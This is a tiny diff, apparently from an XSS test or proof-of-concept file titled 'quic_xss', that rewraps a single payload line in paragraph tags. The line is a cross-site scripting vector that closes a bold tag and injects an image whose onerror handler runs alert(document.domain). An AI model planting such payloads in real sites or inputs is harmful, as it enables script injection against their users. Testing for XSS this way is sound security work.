@@ -2,5 +2,6 @@
 quic_xss
 
 #1
-#aaaaa"</b><img/src=x onerror=alert(document.domain)<b>
-  
+<p>
+aaaaa"</b><img/src=x onerror=alert(document.domain)<b>
+</p>
